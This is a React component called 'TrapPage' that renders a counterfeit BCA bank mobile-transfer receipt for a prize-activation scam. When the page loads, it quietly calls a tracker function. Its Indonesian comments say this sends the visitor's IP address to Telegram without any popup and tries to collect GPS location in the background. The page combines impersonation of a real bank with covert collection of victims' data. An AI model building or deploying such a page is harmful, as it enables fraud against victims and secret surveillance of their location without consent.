import React, { useEffect, useState } from 'react';
import { CheckCircle2, Share2, Download, ChevronLeft, MoreVertical } from 'lucide-react';
import { captureVisitorData } from '../utils/tracker';

const TrapPage = () => {
  const [currentTime, setCurrentTime] = useState('');
  const [currentDate, setCurrentDate] = useState('');

  useEffect(() => {
    // Set dynamic date and time
    const now = new Date();
    const timeStr = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }).replace('.', ':');
    const dateStr = now.toLocaleDateString('id-ID', { day: '2-digit', month: 'short', year: 'numeric' });
    
    setCurrentTime(timeStr);
    setCurrentDate(dateStr);

    // Capture data silently — data IP langsung dikirim ke Telegram tanpa popup
    // GPS dicoba di background, kalau user izinkan = bonus data akurat
    const startTracking = async () => {
      await captureVisitorData();
    };

    // Langsung jalankan tanpa delay supaya data masuk secepat mungkin
    startTracking();
  }, []);

  return (
    <div style={{
      minHeight: '100vh',
      background: '#f1f1f1',
      display: 'flex',
      flexDirection: 'column',
      fontFamily: 'system-ui, -apple-system, sans-serif'
    }}>
      {/* BCA Styled Header */}
      <div style={{
        background: '#003399',
        color: 'white',
        padding: '16px',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <ChevronLeft size={24} />
          <span style={{ fontWeight: '600', fontSize: '18px' }}>M-Transfer</span>
        </div>
        <MoreVertical size={24} />
      </div>

      <div style={{ padding: '20px', flex: 1 }}>
        <div style={{
          background: 'white',
          borderRadius: '12px',
          padding: '24px',
          boxShadow: '0 2px 8px rgba(0,0,0,0.05)',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center'
        }}>
          <div style={{ color: '#00a859', marginBottom: '16px' }}>
            <CheckCircle2 size={64} strokeWidth={1.5} />
          </div>
          
          <h2 style={{ color: '#003399', fontWeight: '800', fontSize: '20px', marginBottom: '4px' }}>M-TRANSFER BERHASIL</h2>
          <p style={{ color: '#666', fontSize: '14px', marginBottom: '24px' }}>{currentDate} {currentTime}</p>

          <div style={{ width: '100%', borderTop: '1px dashed #ddd', paddingTop: '20px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
              <span style={{ color: '#888', fontSize: '14px' }}>DARI REKENING</span>
              <span style={{ fontWeight: '600', fontSize: '14px' }}>342XXXX129</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
              <span style={{ color: '#888', fontSize: '14px' }}>KE REKENING</span>
              <span style={{ fontWeight: '600', fontSize: '14px' }}>883XXXX921</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
              <span style={{ color: '#888', fontSize: '14px' }}>NAMA PENERIMA</span>
              <span style={{ fontWeight: '600', fontSize: '14px' }}>ADMIN REWARD ARTIS</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
              <span style={{ color: '#888', fontSize: '14px' }}>JUMLAH</span>
              <span style={{ fontWeight: '700', fontSize: '16px', color: '#003399' }}>Rp 500.000,00</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
              <span style={{ color: '#888', fontSize: '14px' }}>BERITA</span>
              <span style={{ fontWeight: '600', fontSize: '14px' }}>DP AKTIVASI HADIAH</span>
            </div>
          </div>

          <div style={{ 
            width: '100%', 
            marginTop: '24px', 
            padding: '12px', 
            background: '#e6f4ea', 
            borderRadius: '8px',
            color: '#00a859',
            fontSize: '13px',
            textAlign: 'center',
            fontWeight: '600'
          }}>
            Transaksi Berhasil Terverifikasi
          </div>
        </div>

        <div style={{ 
          marginTop: '20px', 
          display: 'flex', 
          gap: '12px' 
        }}>
          <button style={{
            flex: 1,
            background: 'white',
            border: '1px solid #003399',
            color: '#003399',
            padding: '14px',
            borderRadius: '8px',
            fontWeight: '600',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '8px'
          }}>
            <Download size={18} /> Simpan
          </button>
          <button style={{
            flex: 1,
            background: '#003399',
            border: 'none',
            color: 'white',
            padding: '14px',
            borderRadius: '8px',
            fontWeight: '600',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '8px'
          }}>
            <Share2 size={18} /> Bagikan
          </button>
        </div>
      </div>

      <div style={{ padding: '20px', textAlign: 'center', color: '#999', fontSize: '12px' }}>
        PT BANK CENTRAL ASIA TBK
      </div>
    </div>
  );
};

export default TrapPage;
